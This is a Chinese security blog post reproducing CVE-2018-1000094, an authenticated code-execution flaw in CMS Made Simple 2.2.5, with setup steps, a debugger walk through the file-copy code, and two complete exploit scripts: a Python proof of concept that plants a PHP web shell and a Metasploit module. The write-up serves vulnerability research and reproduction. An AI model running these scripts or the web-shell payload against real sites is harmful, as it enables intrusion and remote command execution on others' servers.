<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>CVE-2018-1000094-CMSMS 2.2.5代码执行漏洞(每周一洞) - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>CVE-2018-1000094-CMSMS 2.2.5代码执行漏洞(每周一洞)</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">
<div class="container text-center mt-3">
    <iframe src="https://duckduckgo.com/search.html?site=https://getshe11.com/&prefill=" style="overflow:hidden;margin:0;padding:0;max-width:80%;height:40px;" frameborder="0"></iframe>
</div>
</div>
<div class="meta">
  <div>2018-08-11 09:31</div>
  <div>
    <span><a href="https://getshe11.com/tags/php/">#php</a></span>
      <span><a href="https://getshe11.com/tags/cmsms/">#CMSMS</a></span>
      </div>
  </div>
<div class="content">
  <h1 id="0x01-前言">0x01 前言</h1>
<p>CMS Made Simple是一个简单易于使用的内容管理系统。它使用PHP，MySQL和Smarty模板引擎开发。</p>
<p>昨天看漏洞库的时候看到这一款CMS，漏洞操作也挺简单的，但是可以申请CVE，于是乎就复现了一篇过程和写漏洞脚本。</p>
<!-- raw HTML omitted -->
<h1 id="0x02-环境">0x02 环境</h1>
<ol>
<li>下载下来是一个安装文件<code>cmsms-2.2.5-install.php</code>，浏览器直接打开
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/2.png" alt=""></li>
<li>默认Next，到数据库连接这一块要先创建一个数据库，我这里创建一个名为simple的数据库，然后填上数据库连接信息
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/1.png" alt="">
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/3.png" alt=""></li>
<li>填写管理账号密码信息
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/4.png" alt=""></li>
<li>填写可写可读的目录和选择语言
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/5.png" alt=""></li>
<li>安装完成，除了邮件模块，不过也用不上。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/6.png" alt=""></li>
</ol>
<h1 id="0x03-漏洞复现过程">0x03 漏洞复现过程</h1>
<ol start="6">
<li>
<p>登录后台
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/7.png" alt=""></p>
</li>
<li>
<p>选择File Manager
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/8.png" alt=""></p>
</li>
<li>
<p>编写一个文件名为a.txt内容为<code>&lt;?php phpinfo();?&gt;</code>的文件，然后点击上传。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/9.png" alt=""></p>
</li>
<li>
<p>选中a.txt，点击copy,名字改为rce.php,然后确定
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/10.png" alt=""><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/11.png" alt=""></p>
</li>
<li>
<p>文件就copy过来了，有点类似系统的copy命令。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/12.png" alt=""></p>
</li>
<li>
<p>访问<code>rce.php</code>
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/13.png" alt=""></p>
</li>
</ol>
<h1 id="0x04-漏洞分析过程">0x04 漏洞分析过程</h1>
<ul>
<li>还记得上一篇的phpok的分析，如果找不出关键文件，可以抓包分析。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/14.png" alt=""><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/15.png" alt="">
可以看到主要是通过文件<code>admin/moduleinterface.php</code>文件进行操作的。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/16.png" alt="">
可能这样看会让人很乱，我们可以用phpstorm的debug来调试整个过程
相关配置可以看https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/</li>
<li>从上面的抓包可以看出来，<code>mact</code>参数是<code>FileManager</code>，<code>m1_</code>是<code>fileaction</code>，大家可以去这里下断点然后一步一步分析整个流程。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/17.png" alt=""></li>
<li>有经验可以看出来，<code>FileManager</code>就是<code>modules\FileManager</code>目录，<code>fileaction</code>就是<code>modules/FileManager/action.fileaction.php</code>文件，再往下看代码的68行，可以看到我们的copy操作的代码。</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($params[<span style="color:#e6db74">&#34;fileactioncopy&#34;</span>]) <span style="color:#f92672">||</span> $fileaction<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;copy&#34;</span>) {
  <span style="color:#66d9ef">include_once</span>(<span style="color:#66d9ef">__DIR__</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/action.copy.php&#34;</span>);
  <span style="color:#66d9ef">return</span>;
}
</code></pre></div><ul>
<li>我们找到这个文件<code>action.copy.php</code>，我们在93行下一个断点，然后去操作copy，可以看到有各种很详细的参数信息。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/18.png" alt=""> <img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/19.png" alt=""></li>
<li>我们F7单步走，可以看到执行<code>$res = copy($src,$dest);</code>的时候没有发生错误。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/20.png" alt=""></li>
<li>这样就正式完成了所有操作，如有不懂可以看下官方文档的<code>copy</code>函数的用法http://www.php.net/manual/en/function.copy.php</li>
</ul>
<h1 id="0x05-漏洞脚本">0x05 漏洞脚本</h1>
<h2 id="python版本">python版本</h2>
<pre><code># Exploit Title: CMS Made Simple 2.2.5 authenticated Remote Code Execution
# Date: 3rd of July, 2018
# Exploit Author: Mustafa Hasan (@strukt93)
# Vendor Homepage: http://www.cmsmadesimple.org/
# Software Link: http://www.cmsmadesimple.org/downloads/cmsms/
# Version: 2.2.5
# CVE: CVE-2018-1000094

import requests
import base64

base_url = &quot;http://127.0.0.1/cmsms/admin&quot;
upload_dir = &quot;/uploads&quot;
upload_url = base_url.split('/admin')[0] + upload_dir
username = &quot;admin&quot;
password = &quot;123456&quot;

csrf_param = &quot;__c&quot;
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = &quot;&lt;?php system($_GET['cmd']);?&gt;&quot;

def parse_csrf_token(location):
    return location.split(csrf_param + &quot;=&quot;)[1]

def authenticate():
    page = &quot;/login.php&quot;
    url = base_url + page
    data = {
        &quot;username&quot;: username,
        &quot;password&quot;: password,
        &quot;loginsubmit&quot;: &quot;Submit&quot;
    }
    response  = requests.post(url, data=data, allow_redirects=False)
    status_code = response.status_code
    if status_code == 302:
        print &quot;[+] Authenticated successfully with the supplied credentials&quot;
        return response.cookies, parse_csrf_token(response.headers['Location'])
    print &quot;[-] Authentication failed&quot;
    return None, None

def upload_txt(cookies, csrf_token):
    mact = &quot;FileManager,m1_,upload,0&quot;
    page = &quot;/moduleinterface.php&quot;
    url = base_url + page
    data = {
        &quot;mact&quot;: mact,
        csrf_param: csrf_token,
        &quot;disable_buffer&quot;: 1
    }
    txt = {
        'm1_files[]': (txt_filename, payload)
    }
    print &quot;[*] Attempting to upload {}...&quot;.format(txt_filename)
    response = requests.post(url, data=data, files=txt, cookies=cookies)
    status_code = response.status_code
    if status_code == 200:
        print &quot;[+] Successfully uploaded {}&quot;.format(txt_filename)
        return True
    print &quot;[-] An error occurred while uploading {}&quot;.format(txt_filename)
    return None

def copy_to_php(cookies, csrf_token):
    mact = &quot;FileManager,m1_,fileaction,0&quot;
    page = &quot;/moduleinterface.php&quot;
    url = base_url + page
    b64 = base64.b64encode(txt_filename)
    serialized = 'a:1:{{i:0;s:{}:&quot;{}&quot;;}}'.format(len(b64), b64)
    data = {
        &quot;mact&quot;: mact,
        csrf_param: csrf_token,
        &quot;m1_fileactioncopy&quot;: &quot;&quot;,
        &quot;m1_path&quot;: upload_dir,
        &quot;m1_selall&quot;: serialized,
        &quot;m1_destdir&quot;: &quot;/&quot;,
        &quot;m1_destname&quot;: php_filename,
        &quot;m1_submit&quot;: &quot;Copy&quot;
    }
    print &quot;[*] Attempting to copy {} to {}...&quot;.format(txt_filename, php_filename)
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
    status_code = response.status_code
    if status_code == 302:
        if response.headers['Location'].endswith('copysuccess'):
            print &quot;[+] File copied successfully&quot;
            return True
    print &quot;[-] An error occurred while copying, maybe {} already exists&quot;.format(php_filename)
    return None

def quit():
    print &quot;[-] Exploit failed&quot;
    exit()

def run():
    cookies,csrf_token = authenticate()
    if not cookies:
        quit()
    if not upload_txt(cookies, csrf_token):
        quit()
    if not copy_to_php(cookies, csrf_token):
        quit()
    print &quot;[+] Exploit succeeded, shell can be found at: {}&quot;.format(upload_url + '/' + php_filename)

run()

</code></pre><h2 id="msf版本">MSF版本</h2>
<pre><code>##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'            =&gt; 'CMS Made Simple Authenticated RCE via File Upload/Copy',
      'Description'     =&gt; %q{
        CMS Made Simple v2.2.5 allows an authenticated administrator to upload a file
        and rename it to have a .php extension. The file can then be executed by opening
        the URL of the file in the /uploads/ directory.
      },
      'Author' =&gt;
        [
          'Mustafa Hasen',  # Vulnerability discovery and EDB PoC
          'Jacob Robles'    # Metasploit Module
        ],
      'License'         =&gt; MSF_LICENSE,
      'References'      =&gt;
        [
          [ 'CVE', '2018-1000094' ],
          [ 'CWE', '434' ],
          [ 'EDB', '44976' ],
          [ 'URL', 'http://dev.cmsmadesimple.org/bug/view/11741' ]
        ],
      'Privileged'  =&gt; false,
      'Platform'  =&gt; [ 'php' ],
      'Arch'  =&gt; ARCH_PHP,
      'Targets' =&gt;
        [
          [ 'Universal', {} ],
        ],
      'DefaultTarget'  =&gt; 0,
      'DisclosureDate' =&gt; 'Jul 03 2018'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, &quot;Base cmsms directory path&quot;, '/cmsms/']),
        OptString.new('USERNAME', [ true, &quot;Username to authenticate with&quot;, '']),
        OptString.new('PASSWORD', [ true, &quot;Password to authenticate with&quot;, ''])
      ])

    register_advanced_options ([
      OptBool.new('ForceExploit',  [false, 'Override check result', false])
    ])
  end

  def check
    res = send_request_cgi({
      'uri' =&gt; normalize_uri(target_uri.path),
      'method' =&gt; 'GET'
    })

    unless res
      vprint_error 'Connection failed'
      return CheckCode::Unknown
    end

    unless res.body =~ /CMS Made Simple&lt;\/a&gt; version (\d+\.\d+\.\d+)/
      return CheckCode::Unknown
    end

    version = Gem::Version.new($1)
    vprint_status(&quot;#{peer} - CMS Made Simple Version: #{version}&quot;)

    if version == Gem::Version.new('2.2.5')
      return CheckCode::Appears
    end

    if version &lt; Gem::Version.new('2.2.5')
      return CheckCode::Detected
    end

    CheckCode::Safe
  end

  def exploit
    unless [CheckCode::Detected, CheckCode::Appears].include?(check)
      unless datastore['ForceExploit']
        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    res = send_request_cgi({
      'uri' =&gt; normalize_uri(target_uri.path, 'admin', 'login.php'),
      'method' =&gt; 'POST',
      'vars_post' =&gt; {
        'username' =&gt; datastore['USERNAME'],
        'password' =&gt; datastore['PASSWORD'],
        'loginsubmit' =&gt; 'Submit'
      }
    })
    unless res
      fail_with(Failure::NotFound, 'A response was not received from the remote host')
    end

    unless res.code == 302 &amp;&amp; res.get_cookies &amp;&amp; res.headers['Location'] =~ /\/admin\?(.*)?=(.*)/
      fail_with(Failure::NoAccess, 'Authentication was unsuccessful')
    end

    vprint_good(&quot;#{peer} - Authentication successful&quot;)
    csrf_name = $1
    csrf_val = $2

    csrf = {csrf_name =&gt; csrf_val}
    cookies = res.get_cookies
    filename = rand_text_alpha(8..12)

    # Generate form data
    message = Rex::MIME::Message.new
    message.add_part(csrf[csrf_name], nil, nil, &quot;form-data; name=\&quot;#{csrf_name}\&quot;&quot;)
    message.add_part('FileManager,m1_,upload,0', nil, nil, 'form-data; name=&quot;mact&quot;')
    message.add_part('1', nil, nil, 'form-data; name=&quot;disable_buffer&quot;')
    message.add_part(payload.encoded, nil, nil, &quot;form-data; name=\&quot;m1_files[]\&quot;; filename=\&quot;#{filename}.txt\&quot;&quot;)
    data = message.to_s

    res = send_request_cgi({
      'uri' =&gt; normalize_uri(target_uri.path, 'admin', 'moduleinterface.php'),
      'method' =&gt; 'POST',
      'data' =&gt; data,
      'ctype' =&gt; &quot;multipart/form-data; boundary=#{message.bound}&quot;,
      'cookie' =&gt; cookies
    })

    unless res &amp;&amp; res.code == 200
      fail_with(Failure::UnexpectedReply, 'Failed to upload the text file')
    end
    vprint_good(&quot;#{peer} - File uploaded #{filename}.txt&quot;)

    fileb64 = Rex::Text.encode_base64(&quot;#{filename}.txt&quot;)
    data = {
      'mact' =&gt; 'FileManager,m1_,fileaction,0',
      &quot;m1_fileactioncopy&quot; =&gt; &quot;&quot;,
      'm1_selall' =&gt; &quot;a:1:{i:0;s:#{fileb64.length}:\&quot;#{fileb64}\&quot;;}&quot;,
      'm1_destdir' =&gt; '/',
      'm1_destname' =&gt; &quot;#{filename}.php&quot;,
      'm1_path' =&gt; '/uploads',
      'm1_submit' =&gt; 'Copy',
      csrf_name =&gt; csrf_val
    }

    res = send_request_cgi({
      'uri' =&gt; normalize_uri(target_uri.path, 'admin', 'moduleinterface.php'),
      'method' =&gt; 'POST',
      'cookie' =&gt; cookies,
      'vars_post' =&gt; data
    })

    unless res
      fail_with(Failure::NotFound, 'A response was not received from the remote host')
    end

    unless res.code == 302 &amp;&amp; res.headers['Location'].to_s.include?('copysuccess')
      fail_with(Failure::UnexpectedReply, 'Failed to rename the file')
    end
    vprint_good(&quot;#{peer} - File renamed #{filename}.php&quot;)

    res = send_request_cgi({
      'uri' =&gt; normalize_uri(target_uri.path, 'uploads', &quot;#{filename}.php&quot;),
      'method' =&gt; 'GET',
      'cookie' =&gt; cookies
    })
  end
end
</code></pre><h1 id="0x06-参考">0x06 参考</h1>
<p>程序下载:http://s3.amazonaws.com/cmsms/downloads/14076/cmsms-2.2.5-install.zip
<a href="https://www.exploit-db.com/exploits/44976/">https://www.exploit-db.com/exploits/44976/</a>
<a href="http://dev.cmsmadesimple.org/bug/view/11741">http://dev.cmsmadesimple.org/bug/view/11741</a>
<a href="https://packetstormsecurity.com/files/148622/CMS-Made-Simple-2.2.5-Authenticated-Remote-Command-Execution.html">https://packetstormsecurity.com/files/148622/CMS-Made-Simple-2.2.5-Authenticated-Remote-Command-Execution.html</a></p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x01-%e5%89%8d%e8%a8%80">
                            0x01 前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x02-%e7%8e%af%e5%a2%83">
                            0x02 环境
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x03-%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0%e8%bf%87%e7%a8%8b">
                            0x03 漏洞复现过程
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x04-%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e8%bf%87%e7%a8%8b">
                            0x04 漏洞分析过程
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x05-%e6%bc%8f%e6%b4%9e%e8%84%9a%e6%9c%ac">
                            0x05 漏洞脚本
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#python%e7%89%88%e6%9c%ac">
                            python版本
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#msf%e7%89%88%e6%9c%ac">
                            MSF版本
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x06-%e5%8f%82%e8%80%83">
                            0x06 参考
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
